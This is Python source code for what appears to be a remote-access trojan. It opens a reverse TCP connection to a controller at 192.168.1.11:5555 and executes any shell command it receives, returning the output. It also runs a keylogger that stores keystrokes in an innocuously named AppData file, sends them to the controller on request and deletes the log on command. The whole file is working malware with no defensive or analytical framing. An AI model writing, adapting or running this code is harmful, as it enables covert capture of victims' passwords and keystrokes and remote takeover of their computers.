import socket
import json
import subprocess
import threading
from pynput.keyboard import Listener
import os
import time


class Keylogger():
    keys = []
    count = 0
    path = os.environ['appdata'] + '\\manager.txt'
    #path = "processmanager.txt"
    flag = 0

    def on_press(self, key):
        self.keys.append(key)
        self.count +=1
        if self.count >= 1:
            self.count = 0
            self.writefile(self.keys)
            self.keys = []

    def read_keys(self):
        with open(self.path, 'rt') as storage:
            return storage.read()

    def writefile(self, keys):
        with open(self.path, 'a') as storage:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("backspace") > 0:
                    storage.write(' Backspace ')
                elif k.find('enter') > 0:
                    storage.write('\n')
                elif k.find('shift') > 0:
                    storage.write(' Shift ')
                elif k.find('space') > 0:
                    storage.write(" ")
                elif k.find('caps_lock') > 0:
                    storage.write(' caps_lock ')
                elif k.find('Key'):
                    storage.write(k)


    def start(self):
        global listener
        with Listener(on_press=self.on_press) as listener:
            listener.join()

    def destruct(self):
        self.flag = 1
        listener.stop()
        os.remove(self.path)





def send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())


def recieve():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.11", 5555))

def shell():
    global klog
    while True:
        command = recieve()
        if command == "quit":
            break
        elif command[:12] == "keylog_start":
            klog = Keylogger()
            t = threading.Thread(target = klog.start)
            t.start()
            send("[+] Keylogger Started!")
        elif command[:11] == "keylog_dump":
            keys = klog.read_keys()
            send(keys)
        elif command[:11] == "keylog_stop":
            klog.destruct()
            send("Keylogger finished")
        else:
            execute = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            send(result)

shell()